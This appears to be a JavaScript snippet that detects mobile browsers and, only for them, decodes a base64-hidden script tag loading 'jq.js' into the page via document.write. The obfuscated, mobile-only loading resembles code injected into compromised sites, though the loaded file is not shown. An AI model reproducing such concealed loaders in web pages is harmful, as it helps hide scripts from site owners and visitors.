if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i.test(navigator.userAgent)) {

var string = 'PHNjcmlwdCBzcmM9ImpxLmpzIj48L3NjcmlwdD4=';
var decodedString = atob(string);
document.write(''+ decodedString +'');
  
}